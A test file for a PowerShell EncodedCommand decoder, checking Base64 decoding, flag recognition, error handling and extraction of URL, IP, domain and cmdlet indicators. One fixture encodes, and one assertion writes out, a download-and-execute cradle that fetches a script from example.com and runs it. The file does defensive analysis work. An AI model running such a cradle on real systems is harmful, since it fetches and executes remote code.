import { describe, expect, it } from 'vitest'
import { decodePowerShellEncodedCommand, extractEncodedCommand, normalizePowerShell } from './psdecoder'

const WRITE_HOST_VECTOR = 'VwByAGkAdABlAC0ASABvAHMAdAAgACcAaABpACcA'
const DOWNLOAD_VECTOR = 'SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AZQB4AGEAbQBwAGwAZQAuAGMAbwBtAC8AYQAuAHAAcwAxACcAKQA='

describe('PowerShell EncodedCommand decoder', () => {
  it('decodes genuine UTF-16LE EncodedCommand vectors exactly', () => {
    expect(decodePowerShellEncodedCommand(`powershell.exe -EncodedCommand ${WRITE_HOST_VECTOR}`).decoded).toBe("Write-Host 'hi'")
    expect(decodePowerShellEncodedCommand(DOWNLOAD_VECTOR).decoded).toBe("IEX (New-Object Net.WebClient).DownloadString('http://example.com/a.ps1')")
  })

  it.each(['-e', '-enc', '-EncodedCommand', '-ec', '-ENCODEDCOMMAND'])('recognizes %s case-insensitively', (flag) => {
    expect(extractEncodedCommand(`powershell ${flag} ${WRITE_HOST_VECTOR}`)).toBe(WRITE_HOST_VECTOR)
  })

  it('accepts a raw Base64 blob', () => expect(extractEncodedCommand(WRITE_HOST_VECTOR)).toBe(WRITE_HOST_VECTOR))

  it('reports invalid Base64 and UTF-16LE without crashing', () => {
    expect(() => decodePowerShellEncodedCommand('%%%')).toThrow('Invalid Base64 input')
    expect(() => decodePowerShellEncodedCommand('QQ==')).toThrow('Invalid UTF-16LE input')
    expect(() => decodePowerShellEncodedCommand('ANg=')).toThrow('Invalid UTF-16LE input')
  })

  it('extracts URL, domain, IP, path, and cmdlet indicators', () => {
    const script = "Write-Host 'http://example.com/a.ps1 api.example.org 192.0.2.4 C:\\Temp\\a.ps1'; New-Object Net.WebClient"
    const bytes = Array.from(script).flatMap((character) => [character.charCodeAt(0), 0])
    const encoded = btoa(String.fromCharCode(...bytes))
    const result = decodePowerShellEncodedCommand(encoded)
    expect(result.indicators.groups.find((group) => group.type === 'url')?.entries[0]?.value).toBe('http://example.com/a.ps1')
    expect(result.indicators.groups.find((group) => group.type === 'domain')?.entries[0]?.value).toBe('api.example.org')
    expect(result.indicators.groups.find((group) => group.type === 'ipv4')?.entries[0]?.value).toBe('192.0.2.4')
    expect(result.indicators.groups.find((group) => group.type === 'windows-path')?.count).toBe(1)
    expect(result.cmdlets).toEqual(['Write-Host', 'New-Object'])
  })

  it('joins only simple adjacent quoted strings', () => expect(normalizePowerShell("Write-Host ('a'+'b')")).toBe("Write-Host ('ab')"))
})
